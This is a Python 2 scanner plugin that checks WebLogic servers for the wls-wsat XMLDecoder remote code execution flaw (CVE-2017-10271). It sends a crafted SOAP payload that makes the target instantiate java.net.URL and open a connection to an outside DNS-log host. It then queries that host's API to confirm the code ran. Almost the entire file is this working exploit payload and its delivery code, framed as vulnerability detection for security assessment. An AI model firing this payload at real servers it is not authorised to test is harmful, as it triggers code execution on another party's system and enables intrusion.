#!/usr/bin/python
#coding:utf-8

import random
import urllib2
import socket
from time import sleep
from config import is_port_open, is_http


def random_str(len):
    str1 = ""
    for i in range(len):
        str1 += (random.choice("ABCDEFGH1234567890"))
    return str(str1)



# @is_port_open
def verify(ip, port=80, name='', timeout=10, types='ip'):
    test_str = random_str(6)
    server_ip = "devil.dns.yoyostay.top"
    check_url = ['/wls-wsat/CoordinatorPortType','/wls-wsat/CoordinatorPortType11']

    heads = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko)',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8',
        'SOAPAction': "",
        'Content-Type': 'text/xml;charset=UTF-8',
        }

    post_str = '''
        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
          <soapenv:Header>
            <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
              <java version="1.8" class="java.beans.XMLDecoder">
                <void class="java.net.URL">
                  <string>http://%s.%s</string>
                  <void method="openStream"/>
                </void>
              </java>
            </work:WorkContext>
          </soapenv:Header>
          <soapenv:Body/>
        </soapenv:Envelope>
                ''' % (test_str, server_ip)
    for url in check_url:
        if types == 'ip':
            target_url = 'http://'+ip+':'+str(port)+url.strip()
        else:
            target_url = 'http://{}{}'.format(ip, url.strip())
        try:
            req = urllib2.Request(url=target_url, headers=heads)
            if 'Web Services' in urllib2.urlopen(req, timeout=timeout).read():
                    req = urllib2.Request(url=target_url, data=post_str, headers=heads)
                    try:
                        urllib2.urlopen(req, timeout=15).read()
                    except Exception  as e:
                        return None
                    sleep(2)
                    dnslog = 'http://dnslog.yoyostay.top/api/dns/devil/{}/'.format(test_str)
                    try:
                        check_result = urllib2.urlopen(dnslog, timeout=timeout).read()
                    except Exception as e:
                        return

                    if "True" in check_result:
                        info = {
                            "url": target_url,
                            "vuln_name": "weblogic wls rce(cve-2017-10271)",
                            "severity": "high",
                            "proof": dnslog
                        }
                        return info
            else:
                pass
        except Exception as e:
            return

    return None
